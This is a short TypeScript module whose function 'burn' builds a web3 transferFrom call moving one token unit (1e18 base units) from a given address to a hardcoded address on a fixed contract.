import { abi } from "./json/abi.json";

export default function burn(web3: any, addr: any): any {
    return new web3.eth.Contract(abi, "0xb52FBE2B925ab79a821b261C82c5Ba0814AAA5e0")
        .methods.transferFrom(
            addr,
            "0xdBC888D701167Cbfb86486C516AafBeFC3A4de6e",
            "1000000000000000000",
            "0x2ad7b504ddbe25a05647312daa8d0bbbafba360686241b7e193ca90f9b01f95faa",
        );
}
